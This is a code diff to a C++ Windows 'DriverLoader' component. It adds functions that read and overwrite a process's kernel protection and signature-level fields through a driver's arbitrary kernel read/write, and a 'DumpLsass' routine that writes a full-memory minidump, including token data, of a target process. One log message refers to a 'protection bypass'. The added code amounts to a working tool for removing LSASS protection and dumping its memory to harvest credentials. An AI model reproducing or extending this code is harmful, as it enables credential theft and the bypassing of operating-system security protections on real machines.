@@ -7,8 +7,11 @@
 #include <psapi.h>
 #include <filesystem>
 #include <fstream>
+#include <DbgHelp.h>
 
 #pragma comment(lib, "Psapi.lib")
+#pragma comment(lib, "Dbghelp.lib")
+
 
 typedef USHORT RTL_ATOM, * PRTL_ATOM;
 
@@ -134,6 +137,116 @@ DriverLoader::SetProcessProtection(
 
 	return TRUE;
 }
+
+BOOLEAN 
+DriverLoader::SetProcessSignatureLevel(
+	ULONG64 Process,
+	ULONG OffsetOfSignatureLevel, 
+	UCHAR* SignatureLevel)
+{
+	return DriverWorker::Write(reinterpret_cast<PVOID>(Process + OffsetOfSignatureLevel),
+							   SignatureLevel,
+							   sizeof(UCHAR));
+}
+
+
+BOOLEAN
+DriverLoader::GetProcessSignatureLevel(
+	ULONG64 Process,
+	ULONG OffsetOfSignatureLevel,
+	UCHAR* SignatureLevel)
+{
+	UCHAR nSignatureLevel{ 0 };
+	if (DriverWorker::Read(reinterpret_cast<PVOID>(Process + OffsetOfSignatureLevel),
+		&nSignatureLevel,
+		sizeof(UCHAR)))
+	{
+		*SignatureLevel = nSignatureLevel;
+		return TRUE;
+	}
+	 
+	return FALSE;
+}
+
+
+DriverLoader::PS_PROTECTION 
+DriverLoader::GetProcessProtection(
+	ULONG64 Process, 
+	ULONG	OffsetOfProtection)
+{
+	PS_PROTECTION Protection{};
+	BOOLEAN bReturn{ FALSE };
+	do
+	{
+		// set protection
+		if (!DriverWorker::Read(reinterpret_cast<PVOID>(Process + OffsetOfProtection),
+								&Protection,
+								sizeof(DriverLoader::PS_PROTECTION)))
+		{
+			LOG("[-] KernelRead Current Process Protection address : " << std::hex << (Process + OffsetOfProtection) << std::dec);
+			LOG("    - Protection Level: " << std::hex << (Protection.Level) << std::dec);
+			LOG("    - Protection Type: " << std::hex << (Protection.Type) << std::dec);
+			break;
+		}
+		else
+		{
+			/*LOG("Porcess object " << std::hex << Process);
+			LOG("OffsetOfProtection " << std::hex << OffsetOfProtection);
+			auto hex = (UCHAR*)(&Protection);
+			LOG("Protection " << std::hex << (int)(*hex));*/
+		}
+
+	} while (FALSE);
+
+	return Protection;
+}
+
+BOOL 
+DriverLoader::DumpLsass(
+	HANDLE	ProcessHandle, 
+	DWORD	Pid, 
+	HANDLE  FileHandle)
+{
+	BOOLEAN result{ FALSE };
+
+	MINIDUMP_TYPE dumpType = static_cast<MINIDUMP_TYPE>(
+		MiniDumpWithFullMemory |
+		MiniDumpWithHandleData |
+		MiniDumpWithUnloadedModules |
+		MiniDumpWithFullMemoryInfo |
+		MiniDumpWithThreadInfo |
+		MiniDumpWithTokenInformation
+		);
+
+	result = MiniDumpWriteDump(ProcessHandle, Pid, FileHandle, dumpType, nullptr, nullptr, nullptr);
+	if (!result)
+	{
+		//LOG("MiniDumpWriteDump failed!!!");
+		DWORD error = GetLastError();
+		switch (error)
+		{
+		case ERROR_TIMEOUT:
+			LOGW(L"Critical: MiniDumpWriteDump timed out - process may be unresponsive or in critical section");
+			break;
+		case RPC_S_CALL_FAILED:
+			LOGW(L"Critical: RPC call failed - process may be a kernel-mode or system-critical process");
+			break;
+		case ERROR_ACCESS_DENIED:
+			LOGW(L"Critical: Access denied - insufficient privileges even with protection bypass");
+			break;
+		case ERROR_PARTIAL_COPY:
+			LOGW(L"Critical: Partial copy - some memory regions could not be read");
+			break;
+		default:
+			LOGW(L"Critical: MiniDumpWriteDump failed " << std::hex << error);
+			break;
+		}
+	}
+
+	return result;
+}
+
+
 
 BOOLEAN 
 DriverLoader::SetSignatureLevel(
